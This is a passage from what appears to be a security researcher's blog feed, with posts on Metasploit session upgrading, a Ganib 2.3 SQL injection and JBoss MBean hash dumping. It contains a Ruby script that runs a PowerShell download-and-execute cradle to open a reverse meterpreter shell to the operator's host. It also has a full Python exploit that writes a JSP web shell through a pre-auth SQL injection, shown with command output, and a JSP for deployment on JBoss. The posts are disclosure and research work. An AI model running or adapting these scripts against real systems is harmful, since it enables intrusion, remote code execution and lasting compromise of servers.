</span><span class='line'>                kill
</span><span class='line'>            end
</span><span class='line'>        end
</span><span class='line'>     end
</span><span class='line'>
</span><span class='line'>     def kill!
</span><span class='line'>        @sent = true
</span><span class='line'>        @server.kill
</span><span class='line'>     end
</span><span class='line'>
</span><span class='line'>     alias :kill :kill!
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Returns if a port is used by a session
</span><span class='line'>#
</span><span class='line'>def is_port_used?(port)
</span><span class='line'>    framework.sessions.each do |sid, obj|
</span><span class='line'>       local_info = obj.instance_variable_get(:@local_info)
</span><span class='line'>       return true if local_info =~ /:#{port}$/
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    false
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def start_http_service(port)
</span><span class='line'>    @server = HTTPServer.new(port, @pl)
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def wait_payload
</span><span class='line'>
</span><span class='line'>    waited = 0
</span><span class='line'>    while (not @server.state)
</span><span class='line'>        select(nil, nil, nil, 1)
</span><span class='line'>        waited += 1
</span><span class='line'>        if (waited &gt; 10) # MAGIC NUMBA
</span><span class='line'>            @server.kill
</span><span class='line'>            raise RuntimeError, "No payload requested"
</span><span class='line'>        end
</span><span class='line'>    end
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def generate(host, port, sport)
</span><span class='line'>    require 'net/http'
</span><span class='line'>
</span><span class='line'>    script_block = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')" % [host, sport]
</span><span class='line'>    cmd = "cmd.exe /c PowerShell.exe -Exec ByPass -Nol %s" % script_block
</span><span class='line'>
</span><span class='line'>    # generate powershell payload
</span><span class='line'>    url = URI.parse('https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')
</span><span class='line'>    req = Net::HTTP::Get.new(url.path)
</span><span class='line'>    http = Net::HTTP.new(url.host, url.port)
</span><span class='line'>    http.use_ssl = true
</span><span class='line'>
</span><span class='line'>    res = http.request(req)
</span><span class='line'>
</span><span class='line'>    if !res or res.code != '200'
</span><span class='line'>      raise RuntimeError, "Could not retrieve Invoke-Shellcode"
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    @pl = res.body
</span><span class='line'>    @pl &lt;&lt; "\nInvoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force" % [host, port]
</span><span class='line'>    return cmd
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Mimics what MSF already does if the user doesn't manually select a payload and lhost
</span><span class='line'>#
</span><span class='line'>lhost = framework.datastore['LHOST']
</span><span class='line'>unless lhost
</span><span class='line'>  lhost = Rex::Socket.source_address
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># If there is no LPORT defined in framework, then pick a random one that's not used
</span><span class='line'># by current sessions. This is possible if the user assumes module datastore options
</span><span class='line'># are the same as framework datastore options.
</span><span class='line'>#
</span><span class='line'>lport = framework.datastore['LPORT']
</span><span class='line'>unless lport
</span><span class='line'>  lport = 4444 # Default meterpreter port
</span><span class='line'>  while is_port_used?(lport)
</span><span class='line'>    # Pick a port that's not used
</span><span class='line'>    lport = [*49152..65535].sample
</span><span class='line'>  end
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'># do the same from above, but for the server port
</span><span class='line'>sport = [*49152..65535].sample
</span><span class='line'>while is_port_used?(sport)
</span><span class='line'>    sport = [*49152..65535].sample
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'># maybe we want our sessions going to another instance?
</span><span class='line'>use_handler = true
</span><span class='line'>use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true)
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Spawn the handler if needed
</span><span class='line'>#
</span><span class='line'>aborted = false
</span><span class='line'>begin
</span><span class='line'>
</span><span class='line'>  mh = nil
</span><span class='line'>  payload_name = 'windows/meterpreter/reverse_https'
</span><span class='line'>  if (use_handler)
</span><span class='line'>      mh = framework.modules.create("exploit/multi/handler")
</span><span class='line'>      mh.datastore['LPORT'] = lport
</span><span class='line'>      mh.datastore['LHOST'] = lhost
</span><span class='line'>      mh.datastore['PAYLOAD'] = payload_name
</span><span class='line'>      mh.datastore['ExitOnSession'] = false
</span><span class='line'>      mh.datastore['EXITFUNC'] = 'process'
</span><span class='line'>      mh.exploit_simple(
</span><span class='line'>        'LocalInput'     =&gt; session.user_input,
</span><span class='line'>        'LocalOutput'    =&gt; session.user_output,
</span><span class='line'>        'Payload'        =&gt; payload_name,
</span><span class='line'>        'RunAsJob'       =&gt; true)
</span><span class='line'>      # It takes a little time for the resources to get set up, so sleep for
</span><span class='line'>      # a bit to make sure the exploit is fully working.  Without this,
</span><span class='line'>      # mod.get_resource doesn't exist when we need it.
</span><span class='line'>      select(nil, nil, nil, 0.5)
</span><span class='line'>      if framework.jobs[mh.job_id.to_s].nil?
</span><span class='line'>        raise RuntimeError, "Failed to start multi/handler - is it already running?"
</span><span class='line'>      end
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    # Generate our command and payload
</span><span class='line'>    cmd = generate(lhost, lport, sport)
</span><span class='line'>
</span><span class='line'>    # start http service
</span><span class='line'>    start_http_service(sport)
</span><span class='line'>
</span><span class='line'>    sleep 2 # give it a sec to startup
</span><span class='line'>
</span><span class='line'>    # execute command
</span><span class='line'>    session.run_cmd(cmd)
</span><span class='line'>
</span><span class='line'>    if not @server.state
</span><span class='line'>        # wait...
</span><span class='line'>        wait_payload
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>rescue ::Interrupt
</span><span class='line'>  # TODO: cleanup partial uploads!
</span><span class='line'>  aborted = true
</span><span class='line'>rescue =&gt; e
</span><span class='line'>  print_error("Error: #{e}")
</span><span class='line'>  aborted = true
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># Stop the job
</span><span class='line'>#
</span><span class='line'>if (use_handler)
</span><span class='line'>  Thread.new do
</span><span class='line'>    if not aborted
</span><span class='line'>      # Wait up to 10 seconds for the session to come in..
</span><span class='line'>      select(nil, nil, nil, 10)
</span><span class='line'>    end
</span><span class='line'>    framework.jobs.stop_job(mh.job_id)
</span><span class='line'>  end
</span><span class='line'>end</span></code></pre></td></tr></table></div></figure>




<h3>Update 09/06/2014</h3>


<p>Tom Sellers submitted a PR on 05/29 that implements the above <a href="https://github.com/rapid7/metasploit-framework/pull/3401">nicely</a>.  It appears to support a large swath of platforms, but only a couple support no-disk-write methods, namely the Powershell method.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[introduction]]></title>
    <link href="http://hatRiot.github.io/blog/2014/03/02/introduction/"/>
    <updated>2014-03-02T21:51:11-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/03/02/introduction</id>
    <content type="html"><![CDATA[<p>This isn&rsquo;t a real introduction post, just a note that I&rsquo;m migrating from Google Blogger to Github Pages with Octopress.  So far it&rsquo;s great.  I&rsquo;m going to be slowly migrating all posts over from Blogger into here, though I may skip a few early posts that aren&rsquo;t as interesting.</p>

<p>Hopefully it provides me with the functionality that I&rsquo;ve been looking for.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ganib project management 2.3 SQLi]]></title>
    <link href="http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli/"/>
    <updated>2014-02-24T21:03:07-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli</id>
    <content type="html"><![CDATA[<p><a href="http://www.ganib.com/">Ganib</a> is a project management tool supporting all the glorious project management utilities.  The latest version, 2.3 and below, is vulnerable to multiple SQL injection vectors.</p>

<p>The first SQL injection vector is a post-auth UPDATE injection in changetheme.jsp:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>String theme = request.getParameter("theme");
</span><span class='line'>User user = (User) pageContext.getAttribute("user", PageContext.SESSION_SCOPE);
</span><span class='line'>if( user != null && user.getID() != null ) {
</span><span class='line'>    DBBean db = new DBBean();
</span><span class='line'>    
</span><span class='line'>    try {
</span><span class='line'>        String query = "UPDATE PN_PERSON SET THEME_ID = '" + theme + "' WHERE PERSON_ID = " + user.getID();
</span><span class='line'>        db.prepareStatement(query);
</span><span class='line'>        db.executePrepared();
</span><span class='line'>    } finally {
</span><span class='line'>        db.release();
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s obvious where the flaw is.</p>

<p>The most serious of the vectors is a preauth SQL injection vulnerability in the login POST request.  The issue with this is that user-controlled data is passed through a series of data objects, all of which fail to sanitize the data, but all of which assume the data is cleansed.</p>

<p>The initial POST request is sent to <code>LoginProcess.jsp</code>.  This builds the LogManager object, which instantiates the object with our provided username, password, and user domain; all unsanitized:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// Grab parameters from Login form
</span><span class='line'>String secure = request.getParameter ("secure");
</span><span class='line'>String username = request.getParameter ("J_USERNAME");
</span><span class='line'>username = username == null ? u_name : username;
</span><span class='line'>String password = request.getParameter ("J_PASSWORD");
</span><span class='line'>password = password == null ? pwd : password;
</span><span class='line'>String userDomain = request.getParameter("userDomain");
</span><span class='line'>
</span><span class='line'>[...]
</span><span class='line'>
</span><span class='line'>else 
</span><span class='line'>    loginManager.createLoginContext(username, password, userDomain);</span></code></pre></td></tr></table></div></figure>


<p>And the request, for reference:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /LoginProcessing.jsp HTTP/1.1
</span><span class='line'>Host: 192.168.1.219:8080
</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Referer: http://192.168.1.219:8080/
</span><span class='line'>Cookie: JSESSIONID=747813A1BB393D97FD577E2010F25F37; g.s=CE7D2D0E1293623B73B56FC239BFA23D; g.r=1; _sid=; _styp=; JSPRootURL=; cookies=true
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 109
</span><span class='line'>
</span><span class='line'>theAction=submit&J_USERNAME=bob%40bob.com&J_PASSWORD=password&language=en&remember_checkbox=on&userDomain=1000</span></code></pre></td></tr></table></div></figure>


<p>Once the loginManager is instantiated, <code>loginManager.completeLogin</code> is called.  This instantiates the <code>DomainAuthenticator</code> object and attempts to login:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>try
</span><span class='line'>{
</span><span class='line'>    domainAuthenticator = DomainAuthenticator.getInstance(this.loginContext.getDomainID(), this.loginContext.getUsername(), this.loginContext.getClearTextPassword());
</span><span class='line'>    domainAuthenticator.authenticate(shadowLogin, isFromSSOLogin);
</span><span class='line'>    statusCode = LoginStatusCode.SUCCESS;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>The <code>DomainAuthenticator</code> object manages authentication with the various supported methods; domain, SSO, etc.  If you&rsquo;re still following with me, the traversal path thus far can be visualized below:</p>

<p><img class="center" src="http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg"></p>

<p>Note that, so far, none of the provided input has yet to be sanitized.</p>

<p>The <code>DomainAuthenticator</code> constructor first instantiates a <code>UserDomain</code> object:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>private DomainAuthenticator(String domainID, String username, String clearTextPassword)
</span><span class='line'>  throws DomainException
</span><span class='line'>{
</span><span class='line'>  try
</span><span class='line'>  {
</span><span class='line'>    UserDomain domain = new UserDomain();
</span><span class='line'>    domain.setID(domainID);
</span><span class='line'>    domain.load();
</span><span class='line'>    setDomain(domain);
</span><span class='line'>
</span><span class='line'>    setAuthenticationContext(new AuthenticationContext(domainID, username, clearTextPassword));
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>Once the <code>UserDomain</code> object is initialized, the <code>domainID</code> is set by our unsanitized <code>userDomain</code> parameter, and the load function is invoked.  The <code>load</code> function is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> public void load()
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    DBBean db = new DBBean();
</span><span class='line'>    try
</span><span class='line'>    {
</span><span class='line'>      load(db);
</span><span class='line'>    } finally {
</span><span class='line'>      db.release();
</span><span class='line'>    }
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  public void load(DBBean db)
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    loadProperties(db);
</span><span class='line'>
</span><span class='line'>    loadUsers(db);
</span><span class='line'>
</span><span class='line'>    loadSupportedConfigurations(db);
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>A <code>DBBean</code> object is created, and passed into an overloaded <code>load</code> function.  This runs three other functions to build the <code>DBBean</code> object; the call we&rsquo;re interested in is <code>loadUsers</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> public void loadUsers(DBBean db)
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    if (this.domainID == null) {
</span><span class='line'>      throw new PersistenceException("UserDomain.loadUsers() can not proceed because the domainID is null");
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    if (this.userCollection == null) {
</span><span class='line'>      this.userCollection = new DomainUserCollection();
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    this.userCollection.setDomainID(getID());
</span><span class='line'>    this.userCollection.load(db);
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>This call invokes yet another object, <code>DomainUserCollection</code>.  Once instantiated, our yet to be sanitized <code>userDomain</code> parameter is set in the object, and the <code>load</code> function is invoked.  This function, finally, takes us to our vulnerable SQL query:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> protected void load(DBBean dbean)
</span><span class='line'>    throws PersistenceException
</span><span class='line'>  {
</span><span class='line'>    String qstrLoadUsersForDomain = "SELECT U.USER_ID, U.USERNAME, U.DISPLAY_NAME,U.USER_STATUS FROM PN_USER_VIEW U WHERE DOMAIN_ID = " + getDomainID();
</span><span class='line'>
</span><span class='line'>    if (this.domainID == null) {
</span><span class='line'>      throw new PersistenceException("DomainUserCollection.load() was unable to load the users for this domain because of an invalid (null) domainID");
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>  [...]
</span><span class='line'>
</span><span class='line'>  dbean.executeQuery(qstrLoadUsersForDomain);</span></code></pre></td></tr></table></div></figure>


<p>Here we can see that our controlled <code>userDomain</code> parameter is injected directly into the SQL query.  This can be exploited using a UNION SELECT with four columns to write a JSP shell out.</p>

<p>Because of the way the Tomcat applicaton&rsquo;s web.xml is configured, we cannot drop a JSP into the ROOT folder and expect it to run.  Have no fear, as the default Tomcat install built into Ganib includes both /manager and /host-manager, which provide perfect receptacles for our dumped shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python ganib_sqli.py -i 192.168.1.64 -p /var/www/ganib/tomcat/webapps/host-manager -j ./cmd.jsp
</span><span class='line'>[!] Dropping ./cmd.jsp on 192.168.1.64...
</span><span class='line'>[!] Dropped at /wjdll.jsp
</span><span class='line'>root@jali:~/exploits# python -c 'import requests; print requests.get("http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd").content'
</span><span class='line'>
</span><span class='line'>/var/www/ganib/tomcat/bin
</span><span class='line'>
</span><span class='line'>    1    2    3
</span><span class='line'>
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p>There will be some issues if Ganib is running in a directory that MySQL does not have permissions to write to, and considering this is a completely portable install, it could be running from anywhere.  Of course, you can also make use of the dozens of stored procedures Ganib installs by default; such as APPLY_ADMIN_PERMISSIONS, REMOVEUSER, or CREATE_PARENT_ADMIN_ROLE; this would simply turn the query from a UNION SELECT into OR PROCEDURE().</p>

<p>I did a quick grep through the remainder of the code base and found multiple other injection vectors; most, however, were postauth.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Exploit title: Ganib 2.0 SQLi
</span><span class='line'># Date: 02/02/2014
</span><span class='line'># Exploit author: drone (@dronesec)
</span><span class='line'># More information:
</span><span class='line'># Vendor homepage: http://www.ganib.com/
</span><span class='line'># Software link: http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip
</span><span class='line'># Version: &lt;= 2.3
</span><span class='line'># Fixed in: 2.4
</span><span class='line'># Tested on: Ubuntu 12.04 (apparmor disabled) / WinXP SP3
</span><span class='line'>
</span><span class='line'>from argparse import ArgumentParser
</span><span class='line'>import sys
</span><span class='line'>import string
</span><span class='line'>import random
</span><span class='line'>import requests
</span><span class='line'>
</span><span class='line'>""" Ganib 2.0 preauth SQLi PoC
</span><span class='line'>    @dronesec
</span><span class='line'>"""
</span><span class='line'>
</span><span class='line'>def loadJSP(options):
</span><span class='line'>    data = ''
</span><span class='line'>
</span><span class='line'>    try:
</span><span class='line'>        with open(options.jsp) as f:
</span><span class='line'>            for line in f.readlines():
</span><span class='line'>                data += line.replace("\"", "\\\"").replace('\n', '')
</span><span class='line'>    except Exception, e:
</span><span class='line'>        print e
</span><span class='line'>        sys.exit(1)
</span><span class='line'>
</span><span class='line'>    return data
</span><span class='line'>
</span><span class='line'>def run(options):
</span><span class='line'>    print '[!] Dropping %s on %s...' % (options.jsp, options.ip)
</span><span class='line'>
</span><span class='line'>    url = "http://{0}:8080/LoginProcessing.jsp".format(options.ip)
</span><span class='line'>    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
</span><span class='line'>
</span><span class='line'>    exploit = '1 UNION SELECT "{0}","1","2","3" INTO OUTFILE "{1}"'
</span><span class='line'>    exploit = exploit.format(loadJSP(options), options.path + '/%s.jsp' % shell)
</span><span class='line'>
</span><span class='line'>    data = { "theAction" : "submit",
</span><span class='line'>             "J_USERNAME" : "test",
</span><span class='line'>             "J_PASSWORD" : "test",
</span><span class='line'>             "language" : "en",
</span><span class='line'>             "remember_checkbox" : "on",
</span><span class='line'>             "userDomain" : exploit
</span><span class='line'>           }
</span><span class='line'>
</span><span class='line'>    res = requests.post(url, data=data)
</span><span class='line'>    if res.status_code is 200:
</span><span class='line'>        print '[!] Dropped at /{0}.jsp'.format(shell)
</span><span class='line'>    else:
</span><span class='line'>        print '[!] Failed to drop JSP (HTTP {0})'.format(res.status_code)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>def parse():
</span><span class='line'>    parser = ArgumentParser()
</span><span class='line'>    parser.add_argument("-i", help='Server ip address', action='store', dest='ip',
</span><span class='line'>                        required=True)
</span><span class='line'>    parser.add_argument("-p", help='Writable web path (/var/www/ganib)', dest='path',
</span><span class='line'>                        action='store', default='/var/www/ganib')
</span><span class='line'>    parser.add_argument("-j", help="JSP to deploy", dest='jsp', action='store')
</span><span class='line'>
</span><span class='line'>    options = parser.parse_args()
</span><span class='line'>    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
</span><span class='line'>    return options
</span><span class='line'>
</span><span class='line'>if __name__ == "__main__":
</span><span class='line'>    run(parse())</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fetching JBoss MBean method hashes]]></title>
    <link href="http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes/"/>
    <updated>2014-01-26T00:24:19-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/01/26/fetching-jboss-mbean-method-hashes</id>
    <content type="html"><![CDATA[<p>Matasano published <a href="http://www.matasano.com/research/OWASP3011_Luca.pdf">one</a> of <a href="https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now">two</a> canonical papers on JBoss exploitation.  While working on a fresh new tool, I came across the JMXInvokerServlet technique, which uses serialized Java requests to deploy to remote MBeans.  This uses a specific object hash to route the JMX request to the correct MBean; in our case, the gold is jboss.jmx:name=Invoker.</p>

<p>In this paper, Matasano provides the hash for JBoss 4.0.3SP1, but does not list any others, nor show how it derived this.  After perusing the code, however, I found it to be quite simple, and have developed a simple method for fetching hashes of not only the Invoker MBean, but any listed in the JBoss registry.</p>

<p>To extract these values, we simply deploy a WAR file that dumps the entirety of the Registry, which is used for hash lookups when routing requests.  This can can be seen below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;%@ page import="org.jboss.system.Registry"%&gt;
</span><span class='line'>&lt;%@ page import="java.io.*"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Map"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Iterator"%&gt;
</span><span class='line'>&lt;%
</span><span class='line'>    Iterator it = Registry.entries.entrySet().iterator();
</span><span class='line'>    while (it.hasNext()){
</span><span class='line'>        Map.Entry pairs = (Map.Entry)it.next();
</span><span class='line'>        out.println(pairs.getKey() + " = " + pairs.getValue() + "&lt;br/&gt;");
</span><span class='line'>        it.remove();
</span><span class='line'>    }
</span><span class='line'>%&gt;</span></code></pre></td></tr></table></div></figure>


<p>When deployed and executed on my local 4.0.5.GA JBoss server, we get:</p>

<p><img class="center" src="http://hatRiot.github.io/images/posts/2014/jb_hash.jpg"></p>

<p>With this, we&rsquo;ve fetched the hash for the Invoker MBean as well as every other invokable MBean in the registry.  This value appears to be common across all 3.x and 4.x JBoss instances.  However, when run against JBoss 5.x/6.x instances, the following is returned:</p>

<p><img class="center" src="http://hatRiot.github.io/images/posts/2014/jb_hash_6x.jpg"></p>

<p>This change is due to the way look-ups are performed in 5.x; instead of the key being an Integer (hash), the key is now an Object, as shown below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>public static Map&lt;Object, Object&gt; entries = new ConcurrentHashMap&lt;Object, Object&gt;();</span></code></pre></td></tr></table></div></figure>


<p>To further enumerate this, we can iterate over the class methods and pull all of their hashes and hash codes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;%@ page import="java.io.*"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Map"%&gt;
</span><span class='line'>&lt;%@ page import="java.util.Iterator"%&gt;
</span><span class='line'>&lt;%@ page import="java.lang.reflect.Method"%&gt;
</span><span class='line'>&lt;%@ page import="org.jboss.system.Registry"%&gt;
